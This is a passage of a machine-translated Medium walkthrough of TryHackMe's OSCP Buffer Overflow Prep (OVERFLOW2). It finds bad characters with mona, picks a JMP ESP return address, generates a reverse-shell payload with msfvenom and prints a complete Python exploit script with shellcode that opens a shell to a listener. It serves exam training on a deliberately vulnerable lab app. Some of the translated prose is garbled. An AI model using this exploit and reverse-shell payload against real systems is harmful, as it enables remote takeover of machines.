class="gh gi pg"><img src="../Images/6fb867c083158b97e3d9defdf9a7b12f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1274/format:webp/1*Vmojg8MuU65cuGssCnmItg.png"/></div></figure><p id="e571" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">同样，x3c是一个坏字符，而x3d不是。</p><p id="cd06" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们只有两个明显的BADCHARS \ x83 \ x84 \ xba \ xbb</p><p id="fcfb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">开始豁免oscp.exe</p><p id="baab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我创建了一个新的bytearray，并从有效负载中删除了\x83</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="48cf" class="ky kz iq ny b gy oc od l oe of">!mona bytearray -b "\x00\x23\x3c\x83"</span></pre><p id="97ad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行服务器</p><p id="369a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">编辑exploit.py从有效负载变量中移除\x83并运行exploit.py</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi om"><img src="../Images/fb3de66565d4f67000da9270b3e6947d.png" data-original-src="https://miro.medium.com/v2/resize:fit:812/format:webp/0*CJ7Okh9M1KBOqIbI.png"/></div></figure><p id="a416" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查ESP指针值</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/18280f24a73c5d8ca92f3d4f08c13a4e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1344/format:webp/1*oOPzNATCic7kJjc8wO9sYA.png"/></div></figure><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="2498" class="ky kz iq ny b gy oc od l oe of">!mona compare -f C:\mona\oscp\bytearray.bin -a 007FFA28</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ph"><img src="../Images/02318b01ccad271989c2b7deca118cd8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1150/format:webp/1*f94HEk0yHPm0c6hAAVqOgQ.png"/></div></figure><p id="b96a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">同样，x83是一个坏字符，x84不是。</p><p id="a9a9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们只有两个明显的BADCHARS \ xba \ xbb</p><p id="bbf5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">开始豁免oscp.exe</p><p id="6aa8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我创建了一个新的bytearray，并从有效负载中删除了\xba</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="33b2" class="ky kz iq ny b gy oc od l oe of">!mona bytearray -b "\x00\x23\x3c\x83\xba"</span></pre><p id="b3b0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行服务器</p><p id="5f8b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">编辑exploit.py从有效负载变量中移除\xba并运行exploit.py</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi om"><img src="../Images/fb3de66565d4f67000da9270b3e6947d.png" data-original-src="https://miro.medium.com/v2/resize:fit:812/format:webp/0*CJ7Okh9M1KBOqIbI.png"/></div></figure><p id="44fa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查ESP指针值</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pi"><img src="../Images/56ddc026ea425e1ea81a7a10f0143081.png" data-original-src="https://miro.medium.com/v2/resize:fit:1336/format:webp/1*cz7fl0VTmOuesm82b1eMeA.png"/></div></figure><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="cb0c" class="ky kz iq ny b gy oc od l oe of">!mona compare -f C:\mona\oscp\bytearray.bin -a 00A4FA28</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi pj"><img src="../Images/47e43db2418d996aa9668ad4868f2528.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2eU8C96T8vbIPPBEP5LG_w.png"/></div></div></figure><p id="a011" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这之后！我们启动它并在MONA中运行比较，我们发现地址现在未被修改。嘣，我们终于有了坏蛋</p><p id="e5bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">未修改错误</p><p id="cba5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">试错之后，顺序是这样的。</p><p id="ea89" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">绿色方框表示正确的坏字符</p><p id="c409" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们再次使用mona命令找到跳转点:</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="4dd7" class="ky kz iq ny b gy oc od l oe of">!mona jmp -r esp -cpb “\x00\x23\x3c\x83\xba”</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pk"><img src="../Images/84b0a47c5693c06d7c2f4bb4eab47361.png" data-original-src="https://miro.medium.com/v2/resize:fit:1234/format:webp/1*QUsc6CAyydVVNK3VeK0GtQ.png"/></div></figure><p id="ad0a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">上述结果中的任何地址都可能被用作漏洞利用中的retn值。小端=反。还要添加填充以允许有效载荷打开包装。</p><p id="7a6b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意地址<strong class="jp ir"> 625011AF </strong></p><blockquote class="pl pm pn"><p id="1fbb" class="jn jo po jp b jq jr js jt ju jv jw jx pp jz ka kb pq kd ke kf pr kh ki kj kk ij bi translated"><strong class="jp ir">注意:-如果625011没有为反向外壳创建完美的支付，则更改地址，直到您获得反向外壳</strong></p></blockquote><p id="fd21" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用新地址更新我们的retn变量，并且必须向后写(因为系统是little-endian=Reverse)。</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="caea" class="ky kz iq ny b gy oc od l oe of">retn = "\xaf\x11\x50\x62"<br/>padding = "\x90" * 16</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ps"><img src="../Images/6e78ff34663cdd3337b58b8f26500500.png" data-original-src="https://miro.medium.com/v2/resize:fit:1018/format:webp/1*ecE3U3DUJp1A7pArGIYkJg.png"/></div></figure><p id="b6a1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在使用msfvenom生成反向shell有效负载。</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="954c" class="ky kz iq ny b gy oc od l oe of">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.73 LPORT=4444 EXITFUNC=thread -b “\x00\x23\x3c\x83\xba” -f c</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi pt"><img src="../Images/ae02b7137bd9adfa24777a49e166bab4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VMk8Y2JRcrPnMbsK9Inrbg.png"/></div></div></figure><p id="03cb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将有效负载复制到exploit.py中，并将有效负载变量设置为buf。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi pu"><img src="../Images/552b8611fe5a50a635113793c59d3db4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*W8FpCschtyT7uveUuY_f1Q.png"/></div></div></figure><p id="3f7e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以最后的有效载荷是我的卡莉</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="9a72" class="ky kz iq ny b gy oc od l oe of">import socket</span><span id="ce7a" class="ky kz iq ny b gy oh od l oe of">ip = "192.168.43.57"<br/>port = 1337<br/>buf = b""<br/>buf += b"\xfc\xbb\x20\xd6\x6b\x2a\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"<br/>buf += b"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xdc\x3e\xe9\x2a\x1c"<br/>buf += b"\xbf\x8e\xa3\xf9\x8e\x8e\xd0\x8a\xa1\x3e\x92\xde\x4d\xb4\xf6"<br/>buf += b"\xca\xc6\xb8\xde\xfd\x6f\x76\x39\x30\x6f\x2b\x79\x53\xf3\x36"<br/>buf += b"\xae\xb3\xca\xf8\xa3\xb2\x0b\xe4\x4e\xe6\xc4\x62\xfc\x16\x60"<br/>buf += b"\x3e\x3d\x9d\x3a\xae\x45\x42\x8a\xd1\x64\xd5\x80\x8b\xa6\xd4"<br/>buf += b"\x45\xa0\xee\xce\x8a\x8d\xb9\x65\x78\x79\x38\xaf\xb0\x82\x97"<br/>buf += b"\x8e\x7c\x71\xe9\xd7\xbb\x6a\x9c\x21\xb8\x17\xa7\xf6\xc2\xc3"<br/>buf += b"\x22\xec\x65\x87\x95\xc8\x94\x44\x43\x9b\x9b\x21\x07\xc3\xbf"<br/>buf += b"\xb4\xc4\x78\xbb\x3d\xeb\xae\x4d\x05\xc8\x6a\x15\xdd\x71\x2b"<br/>buf += b"\xf3\xb0\x8e\x2b\x5c\x6c\x2b\x20\x71\x79\x46\x6b\x1e\x4e\x6b"<br/>buf += b"\x93\xde\xd8\xfc\xe0\xec\x47\x57\x6e\x5d\x0f\x71\x69\xa2\x3a"<br/>buf += b"\xc5\xe5\x5d\xc5\x36\x2c\x9a\x91\x66\x46\x0b\x9a\xec\x96\xb4"<br/>buf += b"\x4f\xa2\xc6\x1a\x20\x03\xb6\xda\x90\xeb\xdc\xd4\xcf\x0c\xdf"<br/>buf += b"\x3e\x78\xa6\x1a\xa9\x47\x9f\x0f\x60\x20\xe2\x4f\x63\xec\x6b"<br/>buf += b"\xa9\xe9\x1c\x3a\x62\x86\x85\x67\xf8\x37\x49\xb2\x85\x78\xc1"<br/>buf += b"\x31\x7a\x36\x22\x3f\x68\xaf\xc2\x0a\xd2\x66\xdc\xa0\x7a\xe4"<br/>buf += b"\x4f\x2f\x7a\x63\x6c\xf8\x2d\x24\x42\xf1\xbb\xd8\xfd\xab\xd9"<br/>buf += b"\x20\x9b\x94\x59\xff\x58\x1a\x60\x72\xe4\x38\x72\x4a\xe5\x04"<br/>buf += b"\x26\x02\xb0\xd2\x90\xe4\x6a\x95\x4a\xbf\xc1\x7f\x1a\x46\x2a"<br/>buf += b"\x40\x5c\x47\x67\x36\x80\xf6\xde\x0f\xbf\x37\xb7\x87\xb8\x25"<br/>buf += b"\x27\x67\x13\xee\x47\x8a\xb1\x1b\xe0\x13\x50\xa6\x6d\xa4\x8f"<br/>buf += b"\xe5\x8b\x27\x25\x96\x6f\x37\x4c\x93\x34\xff\xbd\xe9\x25\x6a"<br/>buf += b"\xc1\x5e\x45\xbf\xc1\x60\xb9\x40"<br/>prefix = "OVERFLOW2 "<br/>offset = 634<br/>overflow = "A" * offset<br/>retn = "\xaf\x11\x50\x62"<br/>padding = "\x90" * 16<br/>payload = buf</span><span id="b0e6" class="ky kz iq ny b gy oh od l oe of">postfix = ""</span><span id="ee68" class="ky kz iq ny b gy oh od l oe of">buffer = prefix + overflow + retn + padding + payload + postfix</span><span id="4617" class="ky kz iq ny b gy oh od l oe of">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><span id="326b" class="ky kz iq ny b gy oh od l oe of">try:<br/>  s.connect((ip, port))<br/>  print("Sending evil buffer...")<br/>  s.send(buffer + "\r\n")<br/>  print("Done!")<br/>except:<br/>  print("Could not connect.")</span></pre><p id="c934" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用netcat启动一个监听器</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pv"><img src="../Images/98b1cc4763ee1b3e8a482b709f77fbd1.png" data-original-src="https://miro.medium.com/v2/resize:fit:666/format:webp/0*qckmoZL9TwujlXwg.png"/></div></figure><p id="a1ed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">再次启动易受攻击的应用程序。执行exploit.py现在回头看netcat。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi om"><img src="../Images/fb3de66565d4f67000da9270b3e6947d.png" data-original-src="https://miro.medium.com/v2/resize:fit:812/format:webp/0*CJ7Okh9M1KBOqIbI.png"/></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pw"><img src="../Images/68f1a9f9386cb64922c5e26e9953d751.png" data-original-src="https://miro.medium.com/v2/resize:fit:1314/format:webp/1*Kx0kZKZwOHHUK01B5n0h9A.png"/></div></figure><p id="dfac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可以在:<br/><strong class="jp ir">LinkedIn:-</strong><a class="ae kx" href="https://www.linkedin.com/in/shamsher-khan-651a35162/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/shamsher-khan-651a35162/</a><br/><strong class="jp ir">Twitter:-</strong><a class="ae kx" href="https://twitter.com/shamsherkhannn" rel="noopener ugc nofollow" target="_blank">https://twitter.com/shamsherkhannn</a><br/><strong class="jp ir">Tryhackme:-</strong><a class="ae kx" href="https://tryhackme.com/p/Shamsher" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/p/Shamsher</a></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/bc9353dc5d26812bd2ed750e53b36a1a.png" data-original-src="https://miro.medium.com/v2/resize:fit:854/format:webp/0*XX-neKHfgfy1gSrk.png"/></div></figure><p id="d368" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如需更多演练，请在出发前继续关注…<br/>…</p><p id="68e5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">点击此处加入电报</strong><br/><a class="ae kx" href="https://t.me/tryhackme_writeups" rel="noopener ugc nofollow" target="_blank">https://t.me/tryhackme_writeups</a></p><p id="7311" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">访问我的其他演练:-</p><div class="lw lx gp gr ly lz"><a href="https://link.medium.com/6SUrliFJpfb" rel="noopener follow" target="_blank"><div class="ma ab fo"><div class="mb ab mc cl cj md"><h2 class="bd ir gy z fp me fr fs mf fu fw ip bi translated">TryHackMe: OSCP缓冲区溢出准备(溢出1)</h2><div class="mg l"><h3 class="bd b gy z fp me fr fs mf fu fw dk translated">Shamsher khan练习基于堆栈的缓冲区溢出！为了OSCP</h3></div><div class="mh l"><p class="bd b dl z fp me fr fs mf fu fw dk translated">link.medium.com</p></div></div><div class="mi l"><div class="px l mk ml mm mi mn kv lz"/></div></div></a></div><div class="lw lx gp gr ly lz"><a href="https://shamsher-khan-404.medium.com/stack-based-buffer-overflow-practical-for-windows-vulnserver-8d2be7321af5" rel="noopener follow" target="_blank"><div class="ma ab fo"><div class="mb ab mc cl cj md"><h2 class="bd ir gy z fp me fr fs mf fu fw ip bi translated">基于堆栈的缓冲区溢出实用程序(Vulnserver)</h2><div class="mg l"><h3 class="bd b gy z fp me fr fs mf fu fw dk translated">Shamsher Khan利用TRUN命令攻击vulnserver缓冲区溢出</h3></div><div class="mh l"><p class="bd b dl z fp me fr fs mf fu fw dk translated">shamsher-khan-404.medium.com</p></div></div><div class="mi l"><div class="py l mk ml mm mi mn kv lz"/></div></div></a></div><p id="c3e5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢您花时间阅读我的演练。<br/>如果你觉得有用，请点击👏按钮👏(高达40倍)并分享<br/>它来帮助其他有类似兴趣的人！+随时欢迎反馈！</p></div></div>    
</body>
</html>